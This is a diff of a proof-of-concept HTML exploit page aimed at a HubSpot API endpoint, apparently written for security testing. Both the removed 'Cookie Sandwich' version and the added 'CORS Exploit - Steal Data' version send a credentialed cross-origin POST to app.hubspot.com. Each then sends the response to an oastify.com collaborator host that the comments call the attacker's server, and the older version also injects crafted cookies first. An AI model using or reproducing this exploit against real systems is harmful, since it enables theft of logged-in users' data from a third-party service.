@@ -1,39 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>Cookie Sandwich</title></head>
+<head>
+    <title>CORS Exploit - Steal Data</title>
+</head>
 <body>
-<script>
-async function steal() {
-    const target = 'https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth';
-    const domain = 'app.hubspot.com';
-    const path = '/api/usage-logging/v1/log/hublytics-multi/no-auth';
-
-    // Sandwich setup
-    document.cookie = `$Version=1; domain=${domain}; path=${path};`;
-    document.cookie = `session="start; domain=${domain}; path=${path};`;
-    document.cookie = `dummy=end"; domain=${domain}; path=/;`;
-
-    // Send request with credentials
-    const res = await fetch(target, {
+    <h1>Loading...</h1>
+    <script>
+    // This sends the request WITH cookies automatically
+    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
         method: 'POST',
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify([{ event: 'test', properties: { t: Date.now() } }])
-    });
-
-    const data = await res.text();
-
-    // Exfiltrate
-    fetch('https://1uwsoqvx198y1ot2gzpz6vpft6zxnobd.oastify.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify({ stolen: data })
-    });
-
-    console.log('✅ Sandwich sent!');
-}
-
-steal();
-</script>
+        credentials: 'include',  // This sends the cookies automatically!
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify([{
+            event: 'page_view',
+            properties: {
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            }
+        }])
+    })
+    .then(r => {
+        console.log('Status:', r.status);
+        console.log('Headers:', r.headers);
+        return r.text();
+    })
+    .then(data => {
+        // Send the response to attacker's server
+        fetch('https://9oy0iyp5vh26vwnaa7j703jnnet5hx5m.oastify.com', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                response: data,
+                origin: window.location.origin
+            })
+        });
+        console.log('Data sent to collaborator:', data);
+    })
+    .catch(e => console.log('Error:', e));
+    </script>
 </body>
 </html>
